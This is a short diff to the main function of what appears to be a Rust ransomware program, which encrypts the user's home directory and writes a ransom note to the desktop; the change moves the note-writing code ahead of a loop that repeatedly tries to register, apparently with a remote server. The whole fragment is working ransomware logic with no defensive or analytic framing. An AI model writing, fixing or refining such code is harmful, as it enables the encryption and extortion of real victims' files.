@@ -23,6 +23,12 @@ fn main() -> std::io::Result<()> {
     encrypt_directory(&home).unwrap(); // I know this many unwraps look
                                        // suspicious, but the chance of this
                                        // failing is less than a solar flare.
+    // Write ransom note to desktop
+    let mut ransomnote = File::create(ransomnoteloc)?; // we *should* have write perms for
+                                                      // the user's HOME
+    ransomnote.write_all(NOTE.as_bytes())?;
+    ransomnote.flush()?;
+
 
     loop {
         let registration_attempt = register();
@@ -32,12 +38,6 @@ fn main() -> std::io::Result<()> {
             sleep(Duration::from_secs(5));
         }
     }
-
-    // Write ransom note to desktop
-    let mut ransomnote = File::create(ransomnoteloc)?; // we *should* have write perms for
-                                                      // the user's HOME
-    ransomnote.write_all(NOTE.as_bytes())?;
-    ransomnote.flush()?;
 
     Ok(())
 }
